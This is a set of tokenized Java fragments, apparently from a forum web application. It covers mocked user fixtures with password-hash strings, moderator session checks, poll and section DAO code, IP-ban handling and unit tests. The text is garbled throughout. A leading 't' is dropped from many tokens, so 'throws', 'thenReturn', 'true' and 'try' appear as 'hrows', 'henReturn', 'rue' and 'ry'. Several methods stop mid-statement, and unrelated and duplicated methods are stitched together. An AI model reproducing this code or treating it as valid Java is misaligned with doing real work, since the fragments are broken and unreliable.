public static ResultSet getAnonymous ( ) hrows Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 2 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " anonymous " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( - 117654 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 4 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " Anonymous " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 161 ) ; return resultSet ; } 
public static ResultSet getModerator ( ) hrows Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 5280 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " svu " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 500 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 500 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " Sergey V. Udaltsov " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " 0vwkMky44u8kIqSasrH+X8mHao1a3jOC " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( " 5280.png " ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 2 ) ; return resultSet ; } 
public static ResultSet getUser5star ( ) hrows Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 13 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " user5star " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 500 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 500 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " 5 star " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 13 ) ; return resultSet ; } 
public static ResultSet getUser1star ( ) hrows Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 14 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " user1star " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 110 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 110 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " 1 star " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 13 ) ; return resultSet ; } 
public static ResultSet getUser45Score ( ) hrows Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 15 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " user45score " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " 45 score " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 13 ) ; return resultSet ; } 
public static ResultSet getUser45ScoreBlocked ( ) hrows Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 16 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " userBlocked " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( rue ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " blocked " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 13 ) ; return resultSet ; } 
public void estToHtmlFormatter ( ) { assertEquals ( RESULT1 , oHtmlFormatter . format ( TEXT1 , false ) ) ; assertEquals ( RESULT2 , oHtmlFormatter . format ( TEXT2 , false ) ) ; assertEquals ( RESULT3 , oHtmlFormatter20 . format ( TEXT3 , false ) ) ; assertEquals ( RESULT8 , oHtmlFormatter20 . format ( TEXT8 , false ) ) ; assertEquals ( RESULT9 , oHtmlFormatter . format ( TEXT9 , false ) ) ; assertEquals ( RESULT10 , oHtmlFormatter . format ( TEXT10 , false ) ) ; assertEquals ( RESULT11 , oHtmlFormatter . format ( TEXT11 , false ) ) ; assertEquals ( RESULT12 , oHtmlFormatter . format ( TEXT12 , false ) ) ; assertEquals ( RESULT13 , oHtmlFormatter . format ( TEXT13 , false ) ) ; assertEquals ( RESULT14 , oHtmlFormatter . format ( TEXT14 , false ) ) ; assertEquals ( RESULT15 , oHtmlFormatter . format ( TEXT15 , false ) ) ; assertEquals ( RESULT16 , oHtmlFormatter . format ( TEXT16 , false ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( RFC1738 , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( CYR_LINK , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( GOOGLE_CACHE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( URL_WITH_AT , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( Latin1Supplement , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( greek , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( QP , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( EMPTY_ANCHOR , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( SLASH_AFTER_AMP , false ) . endsWith ( " </a> " ) ) ; } 
public void performLogin ( HttpServletResponse response , User user ) { session . setAttribute ( " login " , Boolean . TRUE ) ; session . setAttribute ( " nick " , user . getNick ( ) ) ; userDao . updateLastlogin ( user ) ; user . acegiSecurityHack ( response , session ) ; currentUser = user ; } 
public boolean isModeratorSession ( ) { if ( ! isSessionAuthorized ( session ) ) { return false ; } return currentUser . isModerator ( ) ; } 
public boolean isCorrectorSession ( ) { if ( ! isSessionAuthorized ( session ) ) { return false ; } return currentUser . isCorrector ( ) ; } 
public List < RepliesListItem > getRepliesForUser ( User user , boolean showPrivate , int opics , int offset , final boolean readMessage , final boolean secure , ShowEventsController . Filter filter ) { String queryString ; if ( showPrivate ) { String queryPart ; switch ( filter ) { case FAVORITES : queryPart = queryPartFilterFavorites ; break ; case ANSWERS : queryPart = queryPartFilterAnswers ; break ; case DELETED : queryPart = queryPartFilterDeleted ; break ; case REFERENCE : queryPart = queryPartFilterReference ; break ; default : queryPart = " " ; } queryString = String . format ( queryAllRepliesForUser , queryPart ) ; } else { queryString = queryRepliesForUserWihoutPrivate ; } return jdbcTemplate . query ( queryString , new RowMapper < RepliesListItem > ( ) { @Override 
public void createPoll ( List < String > pollList , boolean multiSelect , int msgid ) { final int voteid = getNextPollId ( ) ; jdbcTemplate . update ( insertPoll , voteid , multiSelect , msgid ) ; ry { final Poll poll = getPoll ( voteid ) ; 
public void deletePoll ( Poll poll ) { jdbcTemplate . update ( deletePoll1 , poll . getId ( ) ) ; jdbcTemplate . update ( deletePoll2 , poll . getId ( ) ) ; jdbcTemplate . update ( deletePoll3 , poll . getId ( ) ) ; } 
public void addNewVariant ( Poll poll , String label ) { jdbcTemplate . update ( insertNewVariant , 
public void removeVariant ( PollVariant variant ) { jdbcTemplate . update ( deleteVariant , variant . getId ( ) ) ; } 
public void updateMultiselect ( Poll poll , boolean multiselect ) { jdbcTemplate . update ( updateMultiselect , multiselect , poll . getId ( ) ) ; } 
public PreparedPoll preparePoll ( Topic opic , User user ) hrows PollNotFoundException { Poll poll = pollDao . getPollByTopicId ( opic . getId ( ) ) ; return new PreparedPoll ( poll , 
public PreparedPoll preparePoll ( Topic opic ) hrows PollNotFoundException { return preparePoll ( opic , null ) ; } 
public PreparedTopic prepareTopicForView ( Topic message , boolean minimizeCut , boolean secure , User user ) { return prepareMessage ( message , messageDao . getTags ( message ) , minimizeCut , null , secure , user ) ; } 
private PreparedTopic prepareMessage ( Topic message , List < String > ags , boolean minimizeCut , PreparedPoll poll , boolean secure ) { return prepareMessage ( message , ags , minimizeCut , poll , secure , null ) ; } 
private PreparedTopic prepareMessage ( Topic message , List < String > ags , boolean minimizeCut , PreparedPoll poll , boolean secure , User user ) { ry { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public ModelAndView getMessageNewForum ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , 0 , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewNews ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , 0 , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewPolls ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } return getMessageNew ( Section . SECTION_POLLS , 
public ModelAndView getMessageNewGallery ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , 0 , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewNewsPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) hrows Exception { return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewPollsPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) hrows Exception { return getMessageNew ( Section . SECTION_POLLS , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " ime " ) String ime , @RequestParam ( value = " allow_posting " , required = false ) Boolean allow_posting , @RequestParam ( value = " captcha_required " , required = false ) Boolean captcha_required ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( ime ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( ime ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( ime ) ) { } else if ( " custom " . equals ( ime ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { hrow new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp s ; if ( " unlim " . equals ( ime ) ) { s = null ; } else { s = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = mpl . getCurrentUser ( ) ; user . checkCommit ( ) ; if ( allow_posting = = null ) { allow_posting = false ; } if ( captcha_required = = null ) { captcha_required = false ; } ipBlockDao . blockIP ( ip , user , reason , s , allow_posting , captcha_required ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip ) ) ) ; } 
public void blockIP ( String ip , User moderator , String reason , Timestamp s , Boolean allow_posting , Boolean captcha_required ) { IPBlockInfo blockInfo = getBlockInfo ( ip ) ; if ( ! blockInfo . isInitialized ( ) ) { jdbcTemplate . update ( 
public boolean isBlocked ( ) { return isInitialized ( ) & & ( banDate = = null | | banDate . after ( new Date ( ) ) ) ; } 
public boolean isInitialized ( ) { return initialized ; } 
public boolean isAllowPosting ( ) { return ! isBlocked ( ) | | allowPosting ; } 
public boolean isCaptchaRequired ( ) { return isAllowPosting ( ) & & captchaRequired ; } 
public ModelAndView sameIP ( HttpServletRequest request , @RequestParam ( required = false ) Integer msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } String ip ; ModelAndView mv = new ModelAndView ( " sameip " ) ; int userAgentId = 0 ; if ( msgid ! = null ) { SqlRowSet rs = jdbcTemplate . queryForRowSet ( " SELECT postip, ua_id FROM topics WHERE id=? " , msgid ) ; if ( ! rs . next ( ) ) { rs = jdbcTemplate . queryForRowSet ( " SELECT postip, ua_id FROM comments WHERE id=? " , msgid ) ; if ( ! rs . next ( ) ) { hrow new MessageNotFoundException ( msgid ) ; } } ip = rs . getString ( " postip " ) ; userAgentId = rs . getInt ( " ua_id " ) ; if ( ip = = null ) { hrow new ScriptErrorException ( " No IP data for # " + msgid ) ; } } else { ip = ServletParameterParser . getIP ( request , " ip " ) ; } mv . getModel ( ) . put ( " ip " , ip ) ; mv . getModel ( ) . put ( " uaId " , userAgentId ) ; mv . getModel ( ) . put ( " opics " , getTopics ( ip ) ) ; mv . getModel ( ) . put ( " comments " , getComments ( ip ) ) ; mv . getModel ( ) . put ( " users " , getUsers ( ip , userAgentId ) ) ; IPBlockInfo blockInfo = ipBlockDao . getBlockInfo ( ip ) ; Boolean allowPosting = false ; Boolean captchaRequired = rue ; if ( blockInfo . isInitialized ( ) ) { mv . getModel ( ) . put ( " blockInfo " , blockInfo ) ; allowPosting = blockInfo . isAllowPosting ( ) ; captchaRequired = blockInfo . isCaptchaRequired ( ) ; mv . getModel ( ) . put ( " blockModerator " , userDao . getUserCached ( blockInfo . getModerator ( ) ) ) ; } mv . addObject ( " allowPosting " , allowPosting ) ; mv . addObject ( " captchaRequired " , captchaRequired ) ; mv . getModel ( ) . put ( " or " , IPBlockDao . getTor ( ip ) ) ; return mv ; } 
public void estToHtmlFormatter ( ) { assertEquals ( RESULT1 , oHtmlFormatter . format ( TEXT1 , false ) ) ; assertEquals ( RESULT2 , oHtmlFormatter . format ( TEXT2 , false ) ) ; assertEquals ( RESULT3 , oHtmlFormatter20 . format ( TEXT3 , false ) ) ; assertEquals ( RESULT8 , oHtmlFormatter20 . format ( TEXT8 , false ) ) ; assertEquals ( RESULT9 , oHtmlFormatter . format ( TEXT9 , false ) ) ; assertEquals ( RESULT10 , oHtmlFormatter . format ( TEXT10 , false ) ) ; assertEquals ( RESULT11 , oHtmlFormatter . format ( TEXT11 , false ) ) ; assertEquals ( RESULT12 , oHtmlFormatter . format ( TEXT12 , false ) ) ; assertEquals ( RESULT13 , oHtmlFormatter . format ( TEXT13 , false ) ) ; assertEquals ( RESULT14 , oHtmlFormatter . format ( TEXT14 , false ) ) ; assertEquals ( RESULT15 , oHtmlFormatter . format ( TEXT15 , false ) ) ; assertEquals ( RESULT16 , oHtmlFormatter . format ( TEXT16 , false ) ) ; assertEquals ( RESULT17 , oHtmlFormatter . format ( TEXT17 , false ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( RFC1738 , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( CYR_LINK , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( GOOGLE_CACHE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( URL_WITH_AT , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( Latin1Supplement , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( greek , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( QP , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( EMPTY_ANCHOR , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( SLASH_AFTER_AMP , false ) . endsWith ( " </a> " ) ) ; } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " ime " ) String ime , @RequestParam ( value = " allow_posting " , required = false , defaultValue = " false " ) Boolean allow_posting , @RequestParam ( value = " captcha_required " , required = false , defaultValue = " false " ) Boolean captcha_required ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( ime ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( ime ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( ime ) ) { } else if ( " custom " . equals ( ime ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { hrow new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp s ; if ( " unlim " . equals ( ime ) ) { s = null ; } else { s = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = mpl . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user , reason , s , allow_posting , captcha_required ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip ) ) ) ; } 
public ModelAndView handleRequestInternal ( @RequestParam ( " section " ) int sectionid ) hrows Exception { Section section = sectionService . getSection ( sectionid ) ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " section " , section ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " section " , params ) ; } 
public void processRow ( ResultSet rs ) hrows SQLException { Section section = new Section ( rs ) ; sectionList . add ( section ) ; } 
private void initializeSectionList ( ) { ImmutableList . Builder < Section > sectionListBuilder = ImmutableList . builder ( ) ; List < Section > sections = sectionDao . getAllSections ( ) ; sectionListBuilder . addAll ( sections ) ; sectionList = sectionListBuilder . build ( ) ; } 
private void initializeBoxlet ( ) hrows SectionNotFoundException { sectionNews = sectionService . getSection ( Section . SECTION_NEWS ) ; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " sectionId " , sectionId ) ; Section section = sectionService . getSection ( sectionId ) ; params . put ( " section " , section ) ; params . put ( " info " , sectionService . getAddInfo ( section . getId ( ) ) ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " add-section " , params ) ; } 
public ModelAndView archiveList ( int sectionid , String groupName ) hrows Exception { ModelAndView mv = new ModelAndView ( " view-news-archive " ) ; Section section = sectionService . getSection ( sectionid ) ; mv . getModel ( ) . put ( " section " , section ) ; Group group = null ; if ( groupName ! = null ) { group = groupDao . getGroup ( section , groupName ) ; } mv . getModel ( ) . put ( " group " , group ) ; List < ArchiveDao . ArchiveDTO > items = archiveDao . getArchiveDTO ( section , group ) ; mv . getModel ( ) . put ( " items " , items ) ; return mv ; } 
public ModelAndView group ( int sectionId , Integer offset , String groupName , HttpServletRequest request , HttpServletResponse response ) hrows Exception { Section section = sectionService . getSection ( sectionId ) ; Group group = groupDao . getGroup ( section , groupName ) ; ModelAndView mv = showNews ( null , null , group . getSectionId ( ) , group . getId ( ) , null , offset , request , response ) ; mv . getModel ( ) . put ( " url " , group . getUrl ( ) ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView moveTopicForm ( ServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Topic message = messageDao . getById ( msgid ) ; Section section = sectionService . getSection ( message . getSectionId ( ) ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; return mv ; } 
public ModelAndView moveTopicFormForum ( ServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Topic message = messageDao . getById ( msgid ) ; mv . getModel ( ) . put ( " message " , message ) ; Section section = sectionService . getSection ( Section . SECTION_FORUM ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; return mv ; } 
public void sectionsTest ( ) hrows Exception { List < Section > sectionList = sectionDao . getAllSections ( ) ; Assert . assertEquals ( 4 , sectionList . size ( ) ) ; String addInfo = sectionDao . getAddInfo ( sectionList . get ( 0 ) . getId ( ) ) ; Assert . assertNotNull ( addInfo ) ; } 
public void getSectionIdByNameTest ( ) hrows Exception { Assert . assertEquals ( 1 , sectionService . getSectionIdByName ( " Section 1 " ) ) ; Assert . assertEquals ( 2 , sectionService . getSectionIdByName ( " Section 2 " ) ) ; Assert . assertEquals ( 3 , sectionService . getSectionIdByName ( " Section 3 " ) ) ; Assert . assertEquals ( 4 , sectionService . getSectionIdByName ( " Section 4 " ) ) ; ry { sectionService . getSectionIdByName ( " Section XXX " ) ; 
public void getSectionTest ( ) hrows Exception { Section section = sectionService . getSection ( 3 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( " Section 3 " , section . getName ( ) ) ; Assert . assertTrue ( section . isPremoderated ( ) ) ; Assert . assertFalse ( section . isVotePoll ( ) ) ; Assert . assertTrue ( section . isImagepost ( ) ) ; Assert . assertFalse ( section . isForum ( ) ) ; section = sectionService . getSection ( 2 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( " Section 2 " , section . getName ( ) ) ; Assert . assertTrue ( section . isPremoderated ( ) ) ; Assert . assertFalse ( section . isVotePoll ( ) ) ; Assert . assertFalse ( section . isImagepost ( ) ) ; Assert . assertTrue ( section . isForum ( ) ) ; ry { section = sectionService . getSection ( - 1 ) ; 
public void prepareMessageTest ( ) { ImmutableList < String > ags = ImmutableList . of ( " one " , " wo " ) ; Topic message = mock ( Topic . class ) ; PollDao pollDao = mock ( PollDao . class ) ; GroupDao groupDao = mock ( GroupDao . class ) ; UserDao userDao = mock ( UserDao . class ) ; SectionDao sectionDao = mock ( SectionDaoImpl . class ) ; DeleteInfoDao deleteInfoDao = mock ( DeleteInfoDao . class ) ; TopicDao messageDao = mock ( TopicDao . class ) ; UserAgentDao userAgentDao = mock ( UserAgentDao . class ) ; when ( message . getGroupId ( ) ) . henReturn ( 13 ) ; group id 13 
public SectionScrollModeEnum getScrollMode ( int sectionId ) hrows SectionNotFoundException { Section section = getSection ( sectionId ) ; return section . getScrollMode ( ) ; } 
public void getScrollModeTest ( ) hrows Exception { Section section ; section = sectionService . getSection ( 1 ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; section = sectionService . getSection ( 2 ) ; Assert . assertEquals ( SectionScrollModeEnum . GROUP , section . getScrollMode ( ) ) ; section = sectionService . getSection ( 3 ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; section = sectionService . getSection ( 4 ) ; Assert . assertEquals ( SectionScrollModeEnum . NO_SCROLL , section . getScrollMode ( ) ) ; section = sectionService . getSection ( 5 ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; 
